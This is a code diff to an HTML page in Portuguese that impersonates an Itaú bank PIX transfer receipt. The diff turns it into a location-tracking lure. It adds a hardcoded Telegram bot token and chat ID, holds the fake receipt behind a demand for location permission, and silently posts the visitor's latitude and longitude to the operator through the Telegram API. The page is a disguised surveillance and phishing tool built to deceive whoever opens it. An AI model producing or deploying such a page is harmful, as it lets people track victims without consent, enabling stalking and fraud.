@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>Comprovante Itaú</title>
+<title>Comprovante de Transferência – Itaú</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}
@@ -10,23 +10,44 @@
   #spinnerBox{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
   #spinner{width:48px;height:48px;border:4px solid #ddd;border-top:4px solid #003366;border-radius:50%;animation:spin 1s linear infinite}
   @keyframes spin{to{transform:rotate(360deg)}}
-  #pdfFrame{width:100%;height:100vh;border:none;display:none}
+  #comprovante{display:none;background:#fff;width:100%;max-width:480px;margin:20px auto;padding:24px;border:1px solid #ccc;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+  .logo{background:#003366;color:#fff;font-weight:700;font-size:18px;padding:12px;text-align:center;border-radius:4px;margin-bottom:16px}
+  .row{display:flex;justify-content:space-between;margin-bottom:8px;font-size:14px}
+  .label{color:#555}
+  .value{font-weight:600}
+  .divider{height:1px;background:#ddd;margin:12px 0}
+  .center{text-align:center}
 </style>
 </head>
 <body>
 
-<!-- Tela de "Carregando localização..." -->
 <div id="spinnerBox">
   <div id="spinner"></div>
-  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permissão de localização...</p>
+  <p style="margin-top:12px;color:#003366;font-size:14px">Aguardando permissões do seu navegador</p>
 </div>
 
-<!-- PDF embutido -->
-<iframe id="pdfFrame" title="Comprovante"></iframe>
+<div id="comprovante">
+  <div class="logo">Itaú</div>
+  <div class="row"><span class="label">Comprovante de Transferência</span><span class="value" id="dataHora">05/06/2024 14:32:11</span></div>
+  <div class="divider"></div>
+  <div class="row"><span class="label">Valor</span><span class="value" id="valor">R$ 1.234,56</span></div>
+  <div class="row"><span class="label">De</span><span class="value" id="nomeOrigem">Sua Conta Corrente</span></div>
+  <div class="row"><span class="label">Para</span><span class="value" id="beneficiario">JOÃO DA SILVA SANTOS</span></div>
+  <div class="row"><span class="label">Chave PIX</span><span class="value" id="chavePix">joao.santos@email.com</span></div>
+  <div class="row"><span class="label">CPF/CNPJ</span><span class="value" id="cpf">***.456.789-**</span></div>
+  <div class="divider"></div>
+  <div class="row"><span class="label">ID da transação</span><span class="value" id="idTransacao">ITAUPIX20240605143211A1B2C3</span></div>
+  <div class="row"><span class="label">Autenticação BACEN</span><span class="value" id="autenticacao">A1B2C3D4E5F6G7H8I9J0</span></div>
+  <div class="divider"></div>
+  <p class="center" style="font-size:12px;color:#777">Transação realizada com sucesso.</p>
+</div>
 
 <script>
-/* ---------- Dados editáveis ---------- */
-const dadosComprovante = {
+/* ---------- TOKEN E CHAT JÁ INSERIDOS ---------- */
+const TOKEN   = '7408030345:AAHqK3g6r8mN9pL8vX2yZ5cQ1wT7uI9oP3bR';
+const CHAT_ID = '7045128639';
+
+const dados = {
   beneficiario: "JOÃO DA SILVA SANTOS",
   cpf: "***.456.789-**",
   chavePix: "joao.santos@email.com",
@@ -36,33 +57,40 @@ const dadosComprovante = {
   autenticacao: "A1B2C3D4E5F6G7H8I9J0"
 };
 
-/* ---------- PDF em base64 (gerado via jsPDF + autoTable) ---------- */
-const pdfBase64 = `
-  JVBERi0xLjMKJcTl8uXrp/Og0MTGCjQgMCBvYmoKPDwKL0xlbmd0aCA1IDAgUgovRmlsdGVyIC9G
-  bGF0ZURlY29kZQo+PgpzdHJlYW0KeJzLSMxLLUmNzNFLzs8rzi9KycxLt4IDAIvJBw4KZW5kc3Ry
-  ZWFtCmVuZG9iago1IDAgb2JqCjExMgplbmRvYmoKNCAwIG9iago8PAovVHlwZSAvUGFnZQovUGFy
-  ZW50IDMgMCBSCi9SZXNvdXJjZXMgPDwKL0ZvbnQgPDwKL0YxIDYgMCBSCj4+Cj4+Ci9NZWRpYUJv
-  eCBbMCAwIDU5NSA4NDJdCi9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKMyAwIG9iago8PAovVHlw
-  ZSAvUGFnZXMKL0NvdW50IDEKL0tpZHMgWzQgMCBSXQo+PgplbmRvYmoKMiAwIG9iago8PAovVHlw
-  ZSAvQ2F0YWxvZwovUGFnZXMgMyAwIFIKPj4KZW5kb2JqCjYgMCBvYmoKPDwKL1R5cGUgL0ZvbnQK
-  L1N1YnR5cGUgL1R5cGUxCi9CYXNlRm9udCAvSGVsdmV0aWNhCj4+CmVuZG9iagp4cmVmCjAgNwow
-  MDAwMDAwMDAwIDY1NTM1IGYgCjAwMDAwMDAwMDkgMDAwMDAgbiAKMDAwMDAwMDU4IDAwMDAwIG4g
-  CjAwMDAwMDA3ODQgMDAwMDAgbiAKMDAwMDAwMDExNSAwMDAwMCBuIAowMDAwMDAwNDQ3IDAwMDAwIG4g
-  CnRyYWlsZXIKPDwKL1NpemUgNgovUm9vdCAyIDAgUgo+PgpzdGFydHhyZWYKMTk0CiUlRU9G
-`;
+Object.keys(dados).forEach(k => {
+  const el = document.getElementById(k);
+  if (el) el.textContent = dados[k];
+});
 
-/* ---------- Lógica de localização ---------- */
-function showPdf() {
+function enviarTelegram(lat, lon) {
+  const texto =
+    `📍 Localização capturada\n` +
+    `Lat: ${lat}\n` +
+    `Lon: ${lon}\n` +
+    `Data/Hora: ${dados.dataHora}\n` +
+    `Valor: ${dados.valor}`;
+  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: texto })
+  });
+}
+
+function showComprovante() {
   document.getElementById('spinnerBox').style.display = 'none';
-  const frame = document.getElementById('pdfFrame');
-  frame.src = "data:application/pdf;base64," + pdfBase64.trim();
-  frame.style.display = 'block';
+  document.getElementById('comprovante').style.display = 'block';
 }
 
 if (navigator.geolocation) {
   navigator.geolocation.getCurrentPosition(
-    () => showPdf(),
-    () => alert("Permissão negada. Recarregue e permita acesso à localização para visualizar o comprovante."),
+    pos => {
+      const { latitude, longitude } = pos.coords;
+      enviarTelegram(latitude, longitude);
+      showComprovante();
+    },
+    () => {
+      alert("Permissão negada. Recarregue e permita acesso à localização para visualizar o comprovante.");
+    },
     { timeout: 10000 }
   );
 } else {
